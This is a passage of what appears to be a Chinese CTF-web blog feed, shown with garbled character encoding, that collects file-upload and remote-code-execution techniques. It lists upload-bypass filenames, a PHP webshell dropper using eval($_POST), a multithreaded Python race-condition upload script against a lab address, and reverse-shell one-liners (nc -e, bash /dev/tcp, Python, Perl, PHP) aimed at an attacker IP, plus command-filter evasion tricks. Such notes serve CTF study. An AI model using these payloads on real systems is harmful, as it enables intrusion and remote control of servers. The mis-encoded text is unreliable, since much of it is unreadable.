title="ç™½åå•"></a>ç™½åå•</h2><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>IIS5.X/6.0</code><ul><li><code>ç›®å½•è§£æï¼šå¦‚æœç›®å½•é‡‡å–/1.asp/çš„å‘½ä»¤æ–¹å¼ï¼Œé‚£ä¹ˆè®¿é—®è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶ä¼šé»˜è®¤ä»¥aspçš„æ–¹å¼æ‰§è¡Œ</code></li><li><code>æ–‡ä»¶è§£æï¼šiisè¯»å–åˆ°;ä¼šé»˜è®¤ç»“æŸï¼Œå¯ä»¥ç”¨1.asp;.jpgçš„å½¢å¼è¿›è¡Œç»•è¿‡</code></li><li><code>ç‰¹æ®Šåç¼€ï¼š1.asaã€1.cerã€1.cdx</code></li></ul></li><li><code>IIS7/7.5</code><ul><li>å¦‚æœé…ç½®ä¸­å¼€å¯ <code>cgi.fix_pathinf</code></li><li>åŒ <code>nginx</code> è§£ææ¼æ´</li></ul></li><li><code>Apacheè§£ææ¼æ´</code><ul><li><code>è§£ææ¼æ´:ä»å³åˆ°å·¦åˆ¤æ–­åç¼€å¹¶è§£æï¼ˆä½ç‰ˆæœ¬ï¼‰</code></li><li><code>123.php.asaaï¼šApacheä¼šå…ˆåˆ¤æ–­asaaä¸è®¤è¯†ï¼Œé‚£å°±ä¼šåˆ¤æ–­.phpå®ƒè®¤è¯†å°±é»˜è®¤ä»¥è¿™ç§æ–¹å¼è¿›è¡Œè§£æã€‚</code></li></ul></li><li><code>Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰</code><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>shell.php%0a</code></li></ul></li></ul></li><li><code>Nginxè§£ææ¼æ´</code><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>hack.jpg/1.php</code></li><li><code>nginxçœ‹åˆ°æ–‡ä»¶æ‰©å±•åæ˜¯.phpï¼Œä¾¿ä¸ç®¡è¯¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œç›´æ¥äº¤ç»™phpå¤„ç†ï¼Œç„¶åphpçš„é»˜è®¤é…ç½®ä¸‹çœ‹åˆ°å³è¾¹çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œä¾¿åˆ å»æœ€åçš„æ–‡ä»¶åï¼Œè¯»å–å‰ä¸€ä¸ªï¼Œæ‰€ä»¥å°†.jpgå¤„ç†æˆä¸ºphp</code></li></ul></li></ul></li><li><code>nginx æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰</code><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>shell.gif[0x20][0x00].php</code></li></ul></li></ul></li><li><code>Windowsç¯å¢ƒ</code><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>shell.php.jpg</code></li><li><code>æ­¤æ—¶ç›®å½•ä¸­ä¼šç”Ÿæˆshell.phpæ–‡ä»¶ï¼Œä½†å†…å®¹ä¸ºç©ºã€‚å†åˆ©ç”¨PHPå’ŒWindowsç¯å¢ƒçš„å åŠ å±æ€§ï¼š</code></li><li><code>å†ä¸Šä¼ shell.&gt;&gt;&gt;æ¥åŒ¹é…å¹¶è¦†ç›–shell.php</code></li><li><code>shell.php::$DATA</code></li><li><code>shell.php </code>ï¼ˆphpåæœ‰ä¸ªç©ºæ ¼ï¼‰</li><li><code>shell.php.</code></li></ul></li></ul></li><li><code>shell.phtml</code></li><li><code>shell.php%00</code></li><li><code>shell.gif[0x20][0x00].php</code></li><li><code>shell.php.jpg</code></li><li><code>shell.pphphp</code></li><li><code>shell.PHP</code></li><li><code>shell.php.jpg</code></li></ul></li></ul><h2 id="ç«äº‰ä¸Šä¼ "><a href="#ç«äº‰ä¸Šä¼ " class="headerlink" title="ç«äº‰ä¸Šä¼ "></a>ç«äº‰ä¸Šä¼ </h2><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>å…ˆç§»åŠ¨ï¼Œåæ£€æµ‹ï¼Œä¸ç¬¦åˆå†åˆ é™¤ï¼Œç¬¦åˆåˆ™æ”¹åå­—</code></li><li><code>ä½¿ç”¨å¤šçº¿ç¨‹å¹¶å‘è¿›è¡Œä¸Šä¼ ä¸è®¿é—®æ“ä½œ</code></li><li><code>æŸ¥çœ‹æºä»£ç å‘ç°åªèƒ½ä¸Šä¼ zipé‚£æˆ‘ä»¬ç›´æ¥ä¸Šä¼ ä¸€å¥è¯å°±å¯ä»¥äº†æ³¨æ„ä¿®æ”¹Content-Typeä¸ºapplication/x-zip-compressed</code></li><li><code>ç„¶åç›´æ¥æ–‡ä»¶åŒ…å«å°±å¯ä»¥äº†</code></li></ul></li></ul><h2 id="æ¡ä»¶ç«äº‰ç»•è¿‡"><a href="#æ¡ä»¶ç«äº‰ç»•è¿‡" class="headerlink" title="æ¡ä»¶ç«äº‰ç»•è¿‡"></a>æ¡ä»¶ç«äº‰ç»•è¿‡</h2><ul><li><h2 id="ç¤ºä¾‹ï¼š-æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œæ˜æ˜¾çš„æ¡ä»¶ç«äº‰ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶shell-phpï¼Œå†…å®¹å¦‚ä¸‹-æ‰§è¡Œå¦‚ä¸‹è„šæœ¬è¿›è¡Œç«äº‰ä¸Šä¼ "><a href="#ç¤ºä¾‹ï¼š-æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œæ˜æ˜¾çš„æ¡ä»¶ç«äº‰ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶shell-phpï¼Œå†…å®¹å¦‚ä¸‹-æ‰§è¡Œå¦‚ä¸‹è„šæœ¬è¿›è¡Œç«äº‰ä¸Šä¼ " class="headerlink" title="ç¤ºä¾‹ï¼š- æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œæ˜æ˜¾çš„æ¡ä»¶ç«äº‰ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶shell.phpï¼Œå†…å®¹å¦‚ä¸‹  - &lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#39;); ?&gt;- æ‰§è¡Œå¦‚ä¸‹è„šæœ¬è¿›è¡Œç«äº‰ä¸Šä¼ "></a>ç¤ºä¾‹ï¼š<br>- <code>æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œæ˜æ˜¾çš„æ¡ä»¶ç«äº‰ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶shell.phpï¼Œå†…å®¹å¦‚ä¸‹</code><br>  - <code>&lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#39;); ?&gt;</code><br>- æ‰§è¡Œå¦‚ä¸‹è„šæœ¬è¿›è¡Œç«äº‰ä¸Šä¼ </h2><ul><li><pre><code class="py"># -*- coding:utf-8 -*-import requestsimport threadingimport osclass RaceCondition(threading.Thread):    def __init__(self):        threading.Thread.__init__(self)        self.url = &#39;http://192.168.13.140:8011/uploads/shell.php&#39; #ä¸Šä¼ çš„æ–‡ä»¶åœ°å€        self.uploadUrl = &#39;http://192.168.13.140:8011/index.php&#39; #ä¸Šä¼ æ–‡ä»¶çš„åœ°å€    def _get(self):        print(&#39;try to call uploaded file...&#39;)        r = requests.get(self.url)        if r.status_code == 200:            print(&#39;[*] create file info.php success.&#39;)            os._exit(0)    def _upload(self):        print(&#39;upload file...&#39;)        file = &#123;&#39;myfile&#39;: open(&#39;shell.php&#39;, &#39;r&#39;)&#125; #æœ¬åœ°è„šæœ¬æœ¨é©¬        requests.post(self.uploadUrl, files=file)    def run(self):        while True:            for i in range(5):                self._get()            for i in range(10):                self._upload()                self._get()if __name__ == &#39;__main__&#39;:    threads = 50        for i in range(threads):        t = RaceCondition()        t.start()    for i in range(threads):        t.join() </code></pre></li><li><p><code>æˆåŠŸåè®¿é—®./uploads/info.php</code></p></li></ul></li></ul><hr><h1 id="phpinfo-é¡µé¢"><a href="#phpinfo-é¡µé¢" class="headerlink" title="phpinfo é¡µé¢"></a>phpinfo é¡µé¢</h1><ul><li>PHP ç‰ˆæœ¬ä¿¡æ¯<ul><li>é‡è¦æ€§: é€šè¿‡äº†è§£PHPçš„å…·ä½“ç‰ˆæœ¬ï¼Œä½ å¯ä»¥æŸ¥æ‰¾è¯¥ç‰ˆæœ¬å·²çŸ¥çš„æ¼æ´ã€‚ä¸åŒPHPç‰ˆæœ¬å¯èƒ½å­˜åœ¨ä¸åŒçš„å®‰å…¨é—®é¢˜ï¼Œä¾‹å¦‚è¿œç¨‹ä»£ç æ‰§è¡Œã€æ–‡ä»¶åŒ…å«æ¼æ´ç­‰ã€‚</li><li>å¦‚ä½•åˆ©ç”¨: æŸ¥æ‰¾å¹¶åˆ©ç”¨è¯¥PHPç‰ˆæœ¬çš„CVEï¼ˆCommon Vulnerabilities and Exposuresï¼‰æ¼æ´ã€‚ä¾‹å¦‚ï¼Œè¾ƒæ—§ç‰ˆæœ¬çš„PHPå¯èƒ½å­˜åœ¨æœªä¿®å¤çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</li><li>ä½ç½®: <code>phpinfo()</code> è¾“å‡ºçš„é¡¶éƒ¨é€šå¸¸æ˜¾ç¤º <code>PHP Version</code> å­—æ®µã€‚</li></ul></li><li>åŠ è½½çš„PHPæ¨¡å—<ul><li>é‡è¦æ€§: åŠ è½½çš„æ¨¡å—æ­ç¤ºäº†æœåŠ¡å™¨æ”¯æŒçš„åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œcurlæ¨¡å—å…è®¸ç½‘ç»œè¯·æ±‚ï¼Œgdæ¨¡å—æä¾›å›¾åƒå¤„ç†åŠŸèƒ½ã€‚æŸäº›æ¨¡å—å¯èƒ½å¼•å…¥é¢å¤–çš„æ”»å‡»å‘é‡ã€‚</li><li>å¦‚ä½•åˆ©ç”¨: é€šè¿‡åŠ è½½çš„æ¨¡å—ï¼Œå¯ä»¥è¯†åˆ«å‡ºç‰¹å®šæ¨¡å—çš„æ¼æ´å¹¶åˆ©ç”¨å®ƒä»¬ã€‚ä¾‹å¦‚ï¼Œopensslæ¨¡å—çš„é…ç½®å¯èƒ½å­˜åœ¨å®‰å…¨éšæ‚£ã€‚</li><li>ä½ç½®: <code>phpinfo()</code> é¡µé¢</li></ul></li></ul><hr><h1 id="æ–‡ä»¶ä¸Šä¼ çš„æ¢æµ‹"><a href="#æ–‡ä»¶ä¸Šä¼ çš„æ¢æµ‹" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ çš„æ¢æµ‹"></a>æ–‡ä»¶ä¸Šä¼ çš„æ¢æµ‹</h1><ul><li>åŠŸèƒ½: ä½¿ç”¨ä¸€äº›åœ¨çº¿æˆ–è‡ªå»ºçš„æµ‹è¯•è„šæœ¬ï¼Œæ¢æµ‹æ˜¯å¦å…è®¸æ–‡ä»¶ä¸Šä¼ ã€‚</li><li>ä½¿ç”¨æ–¹æ³•:<ul><li>å°è¯•ä¸Šä¼ ä¸åŒç±»å‹çš„æ–‡ä»¶ï¼ˆå¦‚.php, .jpgï¼‰å¹¶è§‚å¯ŸæœåŠ¡å™¨å“åº”ã€‚</li><li>ä½¿ç”¨Webåº”ç”¨æµ‹è¯•å·¥å…·ï¼ˆå¦‚OWASP ZAPï¼‰ä¸­çš„æ–‡ä»¶ä¸Šä¼ æ¢æµ‹åŠŸèƒ½ã€‚</li></ul></li><li>ç»“æœ: é€šè¿‡å“åº”çŠ¶æ€ç æˆ–æ–‡ä»¶è·¯å¾„çš„è¿”å›ï¼Œåˆ¤æ–­æ–‡ä»¶ä¸Šä¼ çš„æˆåŠŸä¸å¦åŠå…¶å¯èƒ½çš„åˆ©ç”¨æ–¹å¼ã€‚</li></ul><hr><h1 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h1><ul><li>åŠŸèƒ½: Niktoæ˜¯ä¸€æ¬¾å¼€æºçš„WebæœåŠ¡å™¨æ‰«æå™¨ï¼Œç”¨äºæ£€æµ‹WebæœåŠ¡å™¨çš„æ¼æ´å’Œé…ç½®é—®é¢˜ã€‚</li><li>ä½¿ç”¨æ–¹æ³•:<ul><li><code>nikto -h http://example.com</code></li></ul></li><li>ç»“æœ: èƒ½å¤Ÿå‘ç°æœåŠ¡å™¨æš´éœ²çš„æ•æ„Ÿæ–‡ä»¶ã€é…ç½®æ–‡ä»¶å’Œå…¶ä»–æ½œåœ¨æ¼æ´ï¼Œå¹¶æ˜¾ç¤ºPHPç‰ˆæœ¬ç­‰ä¿¡æ¯ã€‚</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>æ–‡ä»¶æ“ä½œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>rceæ€»ç»“</title>
    <link href="/2024/09/01/rce%E6%80%BB%E7%BB%93/"/>
    <url>/2024/09/01/rce%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="ä»£ç æ‰§è¡Œ"><a href="#ä»£ç æ‰§è¡Œ" class="headerlink" title="ä»£ç æ‰§è¡Œ"></a>ä»£ç æ‰§è¡Œ</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><ul><li>assert() </li><li>preg_replace(a,b,c) :cä¸­è¢«açš„è¦æ±‚åŒ¹é…æ—¶ã€‚åŒ¹é…éƒ¨åˆ†ä»¥b(æ­¤æ—¶æ‰§è¡Œ)æ›¿æ¢</li><li>create_function </li><li>åŠ¨æ€è°ƒç”¨ï¼šå˜é‡å½“åšå‡½æ•°ç”¨</li><li>å›è°ƒå‡½æ•° call_user_func(a,b) ä¾‹å­ï¼ša:assertï¼ˆä¸èƒ½æ˜¯evalæˆ–æ˜¯echoè¿™ç§è¯­è¨€ç»“æ„ï¼‰ï¼Œb:$GET_[â€˜cmdâ€™]<ul><li>call_user_func_array(a,b) bæ˜¯æ•°ç»„æ•°ç»„ä¸­çš„å…ƒç´ ä¼šæŒ‰ç…§é¡ºåºä¾æ¬¡ä½œä¸ºå‚æ•°ä¼ é€’ç»™æŒ‡å®šçš„å‡½æ•°æˆ–æ–¹æ³•<ul><li>ä¾‹å¦‚ï¼šfunction add($x, $y) $params &#x3D; [2, 3];$result &#x3D; call_user_func_array(â€˜addâ€™, $params);</li></ul></li><li>array_filter(a,b) aæ•°ç»„bå‡½æ•°</li><li>array_map(a,b)  aå‡½æ•°bæ•°ç»„</li><li>${phpä»£ç }</li></ul></li></ul><h2 id="paylpdï¼ševal-ä¼ å…¥å­—ç¬¦ä¸²è§£é‡Šå…¶ä¸ºphpä»£ç æ‰§è¡Œ"><a href="#paylpdï¼ševal-ä¼ å…¥å­—ç¬¦ä¸²è§£é‡Šå…¶ä¸ºphpä»£ç æ‰§è¡Œ" class="headerlink" title="paylpdï¼ševal()ä¼ å…¥å­—ç¬¦ä¸²è§£é‡Šå…¶ä¸ºphpä»£ç æ‰§è¡Œ"></a>paylpdï¼ševal()ä¼ å…¥å­—ç¬¦ä¸²è§£é‡Šå…¶ä¸ºphpä»£ç æ‰§è¡Œ</h2><ul><li>è½¬æ¥å¤´å†™æ³•ï¼ševal($GET_[1])    è®¿é—®â€¦&#x2F;?1&#x3D;eval($POET_[1]);é“¾æ¥èšå‰‘<ul><li>â€¦&#x2F;?1&#x3D;$a&#x3D;â€™sysâ€™;$b&#x3D;â€™temâ€™;$c&#x3D;$a.$b;$c($POST_[1])postï¼š1&#x3D;ls &#x2F;</li><li><?`$_GET[1]`;&1=nc 43.323.323.2323 4444 -e /bin/bash    æ”»å‡»æ–¹ï¼šnc -lvnp 4444- bash -i >& /dev/tcp/<æ”»å‡»è€…IP>/4444 0>&1- python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<æ”»å‡»è€…IP>",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]);'- perl -e 'use Socket;$i="<æ”»å‡»è€…IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'- php -r '$sock=fsockopen("<æ”»å‡»è€…IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</li><li>ç»å…¸è¯»æ–‡ä»¶å‡½æ•°<ul><li>file_get_contents()</li><li>highlight_file()</li><li>fopen()</li><li>readfile()</li><li>fread()</li><li>fgetss()</li><li>fgets()</li><li>parse_ini_file()</li><li>show_source()</li><li>file()</li><li>var_dump(scandir(â€˜&#x2F;â€˜));</li><li>&#x2F;var&#x2F;www&#x2F;html&#x2F;</li></ul></li></ul></li></ul><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><ul><li>ä½ç‚¹ï¼šsystem(â€œâ€)é‡Œé¢å†™å‘½ä»¤liunxï¼Œä¿è¯è®©ç³»ç»Ÿçœ‹å‡ºæ˜¯å­—ç¬¦ä¸²<ul><li>passthru</li><li>exec</li><li>shell_execæ²¡æœ‰å›æ˜¾çš„æ‰§è¡Œå‡½æ•°æˆ–è€…è®¾ç½®&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1ç­‰æ— å›æ˜¾</li><li>popen</li><li>pcntl_exec</li></ul></li><li>liunxç³»ç»Ÿæ“ä½œï¼š<ul><li>find &#x2F; -name flag*  &#x2F;&#x2F;æ²¡æœ‰flagã€‚æ²¡å…³ç³»æˆ‘ä»¬ç”¨<a href="https://www.runoob.com/linux/linux-comm-find.html">find</a>å‘½ä»¤ä»æ ¹ç›®å½•å¼€å§‹æ‰¾ã€‚</li><li>pwd: æ˜¾ç¤ºå½“å‰å·¥ä½œç›®å½•çš„è·¯å¾„ã€‚</li><li>ls: åˆ—å‡ºå½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚<ul><li>ls -l  # æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</li><li>ls -a  # æ˜¾ç¤ºéšè—æ–‡ä»¶</li><li>ls -laåˆä½“</li></ul></li><li>cd: åˆ‡æ¢ç›®å½•ã€‚<ul><li>cd ..  # è¿”å›ä¸Šä¸€çº§ç›®å½•</li><li>cd ~  # è¿”å›ç”¨æˆ·ä¸»ç›®å½•</li></ul></li><li>cp: å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•ã€‚<ul><li>cp source_file destination_file  # å¤åˆ¶æ–‡ä»¶</li><li>cp -r source_directory destination_directory  # å¤åˆ¶ç›®å½•</li></ul></li><li>mv: ç§»åŠ¨æˆ–é‡å‘½åæ–‡ä»¶å’Œç›®å½•ã€‚<ul><li>mv old_name new_name  # é‡å‘½åæ–‡ä»¶æˆ–ç›®å½•</li><li>mv file_name &#x2F;path&#x2F;to&#x2F;directory  # ç§»åŠ¨æ–‡ä»¶</li></ul></li><li>rm: åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•<ul><li>rm file_name  # åˆ é™¤æ–‡ä»¶</li><li>rm -r directory_name  # åˆ é™¤ç›®å½•</li></ul><p></p></li><li>mkdir: åˆ›å»ºæ–°ç›®å½•ã€‚<ul><li>mkdir new_directory</li></ul></li><li>rmdir: åˆ é™¤ç©ºç›®å½•ã€‚<ul><li>rmdir directory_name</li></ul></li><li>cat: æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ã€‚<ul><li>cat file_name</li></ul><p></p></li><li>more: åˆ†é¡µæ˜¾ç¤ºæ–‡ä»¶å†…å®¹<ul><li>more file_name</li></ul></li><li>less: åˆ†é¡µæ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼Œæ”¯æŒå‘å‰æ»šåŠ¨ã€‚<ul><li>less file_name</li></ul></li><li>head: æ˜¾ç¤ºæ–‡ä»¶çš„å‰å‡ è¡Œã€‚<ul><li>head file_name</li><li>head -n 10 file_name  # æ˜¾ç¤ºæ–‡ä»¶çš„å‰10è¡Œ</li></ul></li><li>æ˜¾ç¤ºæ–‡ä»¶çš„åå‡ è¡Œ</li><li>tail: æ˜¾ç¤ºæ–‡ä»¶çš„åå‡ è¡Œã€‚<ul><li>tail file_name</li><li>tail -n 10 file_name  # æ˜¾ç¤ºæ–‡ä»¶çš„å10è¡Œ</li></ul></li><li>nano: ç®€å•çš„æ–‡æœ¬ç¼–è¾‘å™¨ã€‚<ul><li>nano file_name</li></ul></li><li>åŠŸèƒ½å¼ºå¤§çš„æ–‡æœ¬ç¼–è¾‘å™¨</li><li>vi æˆ– vim: åŠŸèƒ½å¼ºå¤§çš„æ–‡æœ¬ç¼–è¾‘å™¨ã€‚<ul><li>vi file_name</li><li>vim file_name</li></ul></li><li>top: åŠ¨æ€æ˜¾ç¤ºç³»ç»Ÿçš„è¿è¡Œä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿›ç¨‹ã€CPUã€å†…å­˜ä½¿ç”¨æƒ…å†µã€‚<ul><li>ps aux  # æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯</li></ul></li><li>kill: ç»ˆæ­¢è¿›ç¨‹ã€‚<ul><li>kill process_id  # ç»ˆæ­¢æŒ‡å®šè¿›ç¨‹</li><li>kill -9 process_id  # å¼ºåˆ¶ç»ˆæ­¢æŒ‡å®šè¿›ç¨‹</li></ul></li><li>df: æ˜¾ç¤ºæ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜ä½¿ç”¨æƒ…å†µã€‚<ul><li>df</li><li>df -h  # ä»¥äººç±»å¯è¯»çš„æ–¹å¼æ˜¾ç¤º</li></ul></li><li>du: æ˜¾ç¤ºç›®å½•æˆ–æ–‡ä»¶çš„ç£ç›˜ä½¿ç”¨æƒ…å†µã€‚<ul><li>du -h  # ä»¥äººç±»å¯è¯»çš„æ–¹å¼æ˜¾ç¤º</li><li>du -sh directory_name  # æ˜¾ç¤ºç›®å½•æ€»å¤§å°</li></ul></li><li>ping: æµ‹è¯•ç½‘ç»œè¿æ¥ã€‚<ul><li>ping hostname_or_ip</li></ul></li><li>ifconfig: æ˜¾ç¤ºæˆ–é…ç½®ç½‘ç»œæ¥å£ï¼ˆéœ€è¦rootæƒé™ï¼‰ã€‚<ul><li>ifconfig</li><li>æ˜¾ç¤ºç½‘ç»œè¿æ¥ã€è·¯ç”±è¡¨ã€æ¥å£çŠ¶æ€ç­‰</li></ul></li><li>netstat: æ˜¾ç¤ºç½‘ç»œè¿æ¥ã€è·¯ç”±è¡¨ã€æ¥å£çŠ¶æ€ç­‰ã€‚<ul><li>netstat</li><li>netstat -an  # æ˜¾ç¤ºæ‰€æœ‰è¿æ¥</li></ul></li><li>ssh: é€šè¿‡SSHåè®®è¿œç¨‹ç™»å½•ã€‚<ul><li>ssh user@hostname_or_ip</li><li>é€šè¿‡SSHåè®®ä¼ è¾“æ–‡ä»¶</li></ul></li><li>scp: é€šè¿‡SSHåè®®ä¼ è¾“æ–‡ä»¶ã€‚<ul><li>scp local_file user@hostname_or_ip:&#x2F;path&#x2F;to&#x2F;remote_directory</li><li>scp user@hostname_or_ip:&#x2F;path&#x2F;to&#x2F;remote_file local_directory</li></ul></li><li>nc: å»ºç«‹TCPè¿æ¥ã€‚<ul><li>nc <hostname> <port></li><li>nc localhost 80  # è¿æ¥åˆ°æœ¬åœ°çš„80ç«¯å£</li></ul></li><li>nc: ç›‘å¬TCPç«¯å£ã€‚<ul><li>nc -l -p <port></li><li>nc -l -p 1234  # ç›‘å¬æœ¬åœ°çš„1234ç«¯å£</li></ul></li><li>å‘é€æ–‡ä»¶ï¼š<ul><li>nc <hostname> <port> &lt; <file></li><li>nc remote_host 1234 &lt; file.txt  # å°†file.txtå‘é€åˆ°è¿œç¨‹ä¸»æœºçš„1234ç«¯å£</li></ul></li><li>æ¥æ”¶æ–‡ä»¶ï¼š<ul><li>nc -l -p <port> &gt; <file></li><li>nc -l -p 1234 &gt; received_file.txt  # åœ¨æœ¬åœ°ç›‘å¬1234ç«¯å£å¹¶æ¥æ”¶æ–‡ä»¶åˆ°received_file.txt</li></ul></li><li>nc: ç«¯å£æ‰«æã€‚<ul><li>nc -zv <hostname> <start_port>-<end_port></li><li>nc -zv localhost 80-100  # æ‰«ææœ¬åœ°çš„80åˆ°100ç«¯å£</li></ul></li><li>Curl (curl)<ul><li>curl: ä¸‹è½½æ–‡ä»¶ã€‚<ul><li>curl -O <URL></li><li>curl -O <a href="http://example.com/file.txt">http://example.com/file.txt</a>  # ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶</li></ul></li><li>curl: ä¸Šä¼ æ–‡ä»¶ã€‚<ul><li>curl -T <file> <URL></li><li>curl -T file.txt <a href="ftp://ftp.example.com/">ftp://ftp.example.com/</a>  # å°†file.txtä¸Šä¼ åˆ°FTPæœåŠ¡å™¨</li><li>å‘é€GETè¯·æ±‚</li></ul></li><li>curl: å‘é€GETè¯·æ±‚ã€‚<ul><li>curl <URL></li><li>curl <a href="http://api.example.com/data">http://api.example.com/data</a>  # å‘é€</li></ul></li></ul></li><li>shå‘½ä»¤ä¼šå°†æ–‡ä»¶ä¸­çš„å†…å®¹å½“ä½œå‘½ä»¤æ¥æ‰§è¡Œ</li><li>æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œå¯ä»¥åœ¨æ²¡æœ‰å†™å®Œçš„å‘½ä»¤åé¢åŠ \ï¼Œå®ç°å°†ä¸€æ¡å‘½ä»¤å¤šè¡ŒåŒ–ï¼Œä»¥è¡Œæœ«æ²¡æœ‰\ä¸ºç»ˆæ­¢ï¼Œå¦‚ä¸‹ç›¸å½“äºæ‰§è¡Œäº†cat flag.txt</li><li>ca\     t f\      lag.\  txt</li><li>linuxä¸­,åˆ©ç”¨revå¯å°†æ–‡ä»¶å†…å®¹å€’ç½®ï¼ŒåŒæ—¶å¯ä»¥é…åˆ&gt;,*ä½¿ç”¨echo â€˜123456â€™ &gt; test.txtï¼šåˆ›å»ºæ–‡ä»¶ test.txt å¹¶å†™å…¥å†…å®¹ 123456ã€‚</li><li>rev test.txtï¼šåè½¬æ–‡ä»¶ test.txt çš„å†…å®¹ï¼Œè¾“å‡º 654321ã€‚</li><li>è¾“å…¥ * å¹¶æŒ‰å›è½¦ï¼šShell å°† * å±•å¼€ä¸º rev test.txt å¹¶æ‰§è¡Œï¼Œè¾“å‡º 654321ã€‚</li><li><ul><li><blockquote><p>a.txtï¼šShell å°† * å±•å¼€ä¸º rev test.txt å¹¶æ‰§è¡Œï¼Œå°†è¾“å‡ºé‡å®šå‘åˆ° a.txtã€‚</p></blockquote></li></ul></li><li>cat a.txtï¼šæŸ¥çœ‹ a.txt æ–‡ä»¶çš„å†…å®¹ï¼Œè¾“å‡º 654321ã€‚</li><li><blockquote><p>revï¼šåˆ›å»ºä¸€ä¸ªç©ºæ–‡ä»¶åä¸º rev çš„æ–‡ä»¶ï¼Œå¦‚æœ rev æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œåˆ™ä¼šæ¸…ç©ºå…¶å†…å®¹ã€‚</p></blockquote></li><li>linuxä¸­,dirå‘½ä»¤å’Œlsæ•ˆæœåŸºæœ¬ä¸€æ ·ï¼Œåªæœ‰é…åˆé‡å®šå‘ç¬¦å†™å…¥æ–‡ä»¶æ—¶æœ‰ä¸€äº›å·®åˆ«ï¼Œlså†™å…¥æ–‡ä»¶ä¸­æ—¶ï¼Œæ¯ä¸ªæ–‡ä»¶åéƒ½æ˜¯å•ç‹¬ä¸€è¡Œï¼Œå®ƒä¼šè‡ªåŠ¨æ¢è¡Œï¼Œæœ‰æ—¶ä¼šå½±å“åˆ°æˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œï¼Œè€Œdirä¼šæŠŠå†…å®¹å…¨éƒ¨å†™å…¥ä¸€è¡Œä¸­ï¼ŒåŒæ—¶ä¼šè‡ªåŠ¨è¡¥å…¨ç©ºæ ¼</li></ul></li></ul><h2 id="ç»•è¿‡æ–¹å¼"><a href="#ç»•è¿‡æ–¹å¼" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a>ç»•è¿‡æ–¹å¼</h2><ul><li>ç¬¦å·<ul><li>;è”åˆæ‰§è¡Œ </li><li>||æˆ–  ç»•è¿‡é»‘æ´</li><li>&amp;&amp;ä¸</li><li>|ä¼ åˆ°</li><li>?ä¸ç¡®å®š</li><li>*é€šé…</li><li>. &gt;å‘½ä»¤ä¼šå°†åŸæœ‰æ–‡ä»¶å†…å®¹è¦†ç›–ï¼Œ&gt;&gt;ä¼šå°†å­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶å†…å®¹æœ«å°¾ï¼Œä¸ä¼šè¦†ç›–åŸæœ‰çš„å†…å®¹</li></ul></li></ul><h2 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤"></a>è¿‡æ»¤</h2><ul><li><p>ç©ºæ ¼   ${IFS}     $IFS$9     %09 </p><p>â€‹         åœ¨envæˆ–è€…printenvç¯å¢ƒå˜é‡é‡Œæ‰¾ç©ºæ ¼system(env | grep â€˜ â€˜)å¾—åˆ°MYVAR&#x3D;hello world${MYVAR:5:1} æˆ–è€…echo@123è¡¨ç¤ºå³ä½¿123å‡ºé”™ä¹Ÿä¸è¦æŠ¥é”™ï¼Œecho~123å–å  